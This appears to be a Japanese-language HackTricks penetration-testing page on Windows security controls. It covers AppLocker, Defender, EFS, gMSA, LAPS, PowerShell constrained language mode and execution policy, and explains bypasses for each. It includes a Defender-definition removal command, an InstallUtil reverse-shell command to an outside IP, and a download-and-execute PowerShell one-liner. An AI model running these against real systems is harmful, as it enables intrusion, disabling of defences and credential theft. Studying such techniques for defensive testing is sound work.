# Windows Security Controls

{{#include ../banners/hacktricks-training.md}}

## AppLocker Policy

アプリケーションのホワイトリストとは、システム上に存在し、実行することが許可された承認済みのソフトウェアアプリケーションまたは実行可能ファイルの一覧です。目的は、組織固有のビジネスニーズに合致しない有害な malware や未承認のソフトウェアから環境を保護することです。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) は Microsoft の**アプリケーションホワイトリストソリューション**であり、システム管理者が**ユーザーによる実行を許可するアプリケーションやファイルを制御**できるようにします。実行可能ファイル、スクリプト、Windows インストーラーファイル、DLL、パッケージ化されたアプリ、パッケージ化されたアプリインストーラーを対象に、**きめ細かな制御**を提供します。\
組織が **cmd.exe と PowerShell.exe** および特定のディレクトリへの書き込みアクセスを**ブロックする**のは一般的ですが、**これらはすべて bypass できます**。

### 確認

ブラックリストまたはホワイトリストに登録されているファイルや拡張子を確認します：
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
`Test-AppLockerPolicy` は、特定の identity に対して候補ファイルを AppLocker policy と照合します。ルールは users または groups を対象にできるため、payload を実行する token を持つ account をテストしてください。`Get-AppLockerFileInformation` は、ルールが照合する可能性のある path、hash、publisher metadata の確認にも役立ちます。<sup>[[5]](#references)</sup>
```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```
このレジストリパスには、AppLockerによって適用される設定とポリシーが含まれており、システム上で現在適用されているルールセットを確認できます。

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policyをbypassするのに役立つ**書き込み可能なフォルダー**: AppLockerが`C:\Windows\System32`または`C:\Windows`内の任意のファイルの実行を許可している場合、これを**bypass**するために使用できる**書き込み可能なフォルダー**があります。
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 一般的に**信頼されている**[**「LOLBAS」**](https://lolbas-project.github.io/)バイナリも、AppLockerのbypassに役立ちます。
- **不適切に記述されたルールもbypassできる可能性があります**
- 例えば、**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**の場合、どこにでも**`allowed`という名前のフォルダー**を作成でき、許可されます。
- 組織は、**`%System32%\WindowsPowerShell\v1.0\powershell.exe`実行ファイルのblock**に注力することがよくありますが、`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`や`PowerShell_ISE.exe`など、その他の[**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)を見落としています。
- システムへの追加負荷や、何も壊れないことを確認するために必要なテスト量が原因で、**DLL enforcementが有効になっていることは非常にまれ**です。そのため、**DLLをbackdoorとして使用することでAppLockerのbypassに役立ちます**。
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)または[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)を使用すると、任意のprocess内で**Powershell** codeを**execute**し、AppLockerをbypassできます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)を確認してください。<sup>[[1]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

ローカルcredentialsはこのfileに存在し、passwordはhash化されています。

### Local Security Authority (LSA) - LSASS

Single Sign-Onのため、このsubsystemの**memory**内に**credentials**（hash化済み）が**保存**されます。\
**LSA**は、ローカルの**security policy**（password policy、users permissionsなど）、**authentication**、**access tokens**などを管理します。\
LSAは、（ローカルloginの場合）**SAM** file内に提供されたcredentialsを**check**し、domain userをauthenticateするために**domain controller**と**通信**します。

**credentials**は**process LSASS**内に**保存**されます。Kerberos tickets、NTおよびLM hashes、容易にdecryptedできるpasswordなどです。

### LSA secrets

LSAは、いくつかのcredentialsをdiskに保存することがあります。

- Active Directoryのcomputer accountのpassword（到達不能なdomain controller）。
- Windows servicesのaccountsのpassword
- scheduled tasksのpassword
- その他（IIS applicationsのpasswordなど）

### NTDS.dit

これはActive Directoryのdatabaseです。Domain Controllersにのみ存在します。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender)は、Windows 10およびWindows 11、ならびにWindows Serverの各versionで利用できるAntivirusです。**`WinPEAS`**などの一般的なpentesting toolsを**block**します。ただし、これらのprotectionを**bypassする方法**があります。

### Check

**Defender**の**status**を確認するには、PS cmdlet **`Get-MpComputerStatus`**をexecuteします（有効かどうかを確認するには、**`RealTimeProtectionEnabled`**の値を確認します）。

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

enumerateするには、次のコマンドも実行できます。
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## 暗号化ファイル システム (EFS)

EFS は、**File Encryption Key (FEK)** と呼ばれる **対称鍵** を使用してファイルを暗号化し、ファイルを保護します。この鍵はユーザーの **公開鍵** で暗号化され、暗号化されたファイルの $EFS **代替データ ストリーム** 内に保存されます。復号が必要な場合、ユーザーのデジタル証明書に対応する **秘密鍵** を使用して、$EFS ストリームから FEK を復号します。詳細については[こちら](https://en.wikipedia.org/wiki/Encrypting_File_System)を参照してください。

**ユーザーによる開始なしで復号されるシナリオ**には、次のものがあります。

- ファイルまたはフォルダーが [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) などの EFS 以外のファイル システムに移動されると、自動的に復号されます。
- SMB/CIFS プロトコルを介してネットワーク経由で送信される暗号化ファイルは、送信前に復号されます。

この暗号化方式により、所有者は暗号化されたファイルに **透過的にアクセス** できます。ただし、所有者のパスワードを変更してログインするだけでは、復号できません。

**主なポイント**:

- EFS は対称 FEK を使用し、ユーザーの公開鍵で暗号化します。
- 復号では、ユーザーの秘密鍵を使用して FEK にアクセスします。
- FAT32 へのコピーやネットワーク送信など、特定の条件下では自動的に復号されます。
- 暗号化されたファイルには、所有者が追加操作なしでアクセスできます。

### EFS 情報の確認

**ユーザー**がこの**サービスを使用した**かどうかを、次のパスが存在するか確認して調べます:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

cipher /c \<file>\ を使用して、ファイルに**アクセスできるユーザー**を確認します\
フォルダー内で `cipher /e` と `cipher /d` を使用して、すべてのファイルを**暗号化**および**復号**することもできます

### EFS ファイルの復号

#### Authority System になる

この方法では、ホスト上で **victim user** が **process** を **実行中** である必要があります。その場合、`meterpreter` セッションからユーザーのプロセス トークン（`incognito` の `impersonate_token`）を偽装できます。または、ユーザーのプロセスに `migrate` することもできます。

#### ユーザーのパスワードを知っている場合

Mimikatz はユーザーの証明書と秘密鍵をインポートし、それらを使用して EFS で保護されたファイルを復号できます。<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft は、IT インフラストラクチャにおける service account の管理を簡素化するために **Group Managed Service Accounts (gMSA)** を開発しました。通常、従来の service account では "**Password never expire**" 設定が有効になっていることが多いのに対し、gMSA はより安全で管理しやすいソリューションを提供します。

- **自動パスワード管理**: gMSA は、domain または computer のポリシーに従って自動的に変更される、240 文字の複雑なパスワードを使用します。この処理は Microsoft の Key Distribution Service (KDC) によって行われるため、手動でパスワードを更新する必要がありません。
- **セキュリティの強化**: これらのアカウントは lockout の影響を受けず、interactive login に使用することもできないため、セキュリティが強化されます。
- **複数ホストのサポート**: gMSA は複数の host で共有できるため、複数の server で実行される service に適しています。
- **Scheduled Task の実行**: managed service account とは異なり、gMSA は scheduled task の実行をサポートします。
- **SPN 管理の簡素化**: computer の sAMaccount 情報または DNS name に変更があると、システムが Service Principal Name (SPN) を自動的に更新するため、SPN 管理が簡素化されます。

gMSA のパスワードは LDAP property _**msDS-ManagedPassword**_ に保存され、Domain Controller (DC) によって 30 日ごとに自動的に reset されます。このパスワードは、[MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) と呼ばれる暗号化された data blob であり、authorized administrator と gMSA が install されている server のみが取得できます。これにより、安全な環境が確保されます。この情報にアクセスするには、LDAPS などの secured connection が必要であるか、'Sealing & Secure' で connection を authenticate する必要があります。

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

このパスワードは [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** で読み取ることができます。
```
/GMSAPasswordReader --AccountName jkohler
```
[**この投稿で詳細を確認**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

また、**gMSA** の **password** を **read** するために **NTLM relay attack** を実行する方法については、この [web page](https://cube0x0.github.io/Relaying-for-gMSA/) も確認してください。<sup>[[3]](#references)</sup>

## LAPS

列挙時には、**legacy Microsoft LAPS** とネイティブの **Windows LAPS** 実装を区別してください。Windows LAPS は 2023 年 4 月 11 日の Windows updates で提供され、管理対象のローカル administrator password を **Windows Server Active Directory** または **Microsoft Entra ID** にバックアップできます。AD-backed deployment では、さらに password の暗号化、暗号化された password history の保持、domain controller の DSRM password の管理も可能です。ダウンロード可能な legacy MSI は新しい Windows versions では deprecated ですが、Windows LAPS は legacy-emulation mode で動作できます。<sup>[[6]](#references)</sup>

legacy Microsoft LAPS と Windows LAPS は別々の実装であるため、attribute-specific または cmdlet-specific な攻撃を適用する前に、どちらが deployment されているかを特定してください。リンク先のページでは、discovery、ACL enumeration、retrieval、expiration manipulation、offline recovery について扱っているため、ここではそれらの手順を重複して説明しません。<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) は、PowerShell を効果的に使用するために必要な多くの機能を **ロックダウン** します。たとえば、COM objects をブロックし、承認済みの .NET types のみを許可し、XAML-based workflows、PowerShell classes なども制限します。

### **確認**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
現在の Windows ではその Bypass は機能しませんが、[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) を使用できます。\
**コンパイルするには** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` を追加し、**プロジェクトを .Net4.5 に変更する必要がある場合があります**。

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) または [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用すると、任意のプロセスで **Powershell** コードを**実行**し、constrained mode を回避できます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode) を確認してください。<sup>[[1]](#references)</sup>

## PS 実行ポリシー

デフォルトでは **restricted** に設定されています。このポリシーを回避する主な方法は次のとおりです。<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
詳細は[こちら](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>をご覧ください。

## Security Support Provider Interface (SSPI)

ユーザーを認証するために使用できる API です。

SSPI は、通信を行おうとする 2 台のマシンに適したプロトコルを見つける役割を担います。これには Kerberos が推奨されます。その後、SSPI は使用する認証プロトコルをネゴシエートします。これらの認証プロトコルは Security Support Provider (SSP) と呼ばれ、各 Windows マシン内に DLL として配置されています。通信を行うには、両方のマシンが同じ SSP をサポートしている必要があります。

### 主な SSP

- **Kerberos**: 推奨される SSP
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** および **NTLMv2**: 互換性上の理由
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web サーバーおよび LDAP 用。パスワードは MD5 hash の形式
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL および TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: 使用するプロトコルをネゴシエートするために使用されます（Kerberos または NTLM。デフォルトは Kerberos）
- %windir%\Windows\System32\lsasrv.dll

#### ネゴシエーションでは、複数の方法または 1 つの方法のみが提示される場合があります。

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**権限昇格された操作に対する同意プロンプト**を表示する機能です。

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}



## References

- [1] [AppLocker と PowerShell constrained language mode の bypass](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [howto ~ EFS ファイルを復号する](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [gMSA の Relaying](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [PowerShell Execution Policy を bypass する 15 の方法](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [AppLocker Windows PowerShell cmdlets を使用する](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Windows LAPS の概要](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
{{#include ../banners/hacktricks-training.md}}
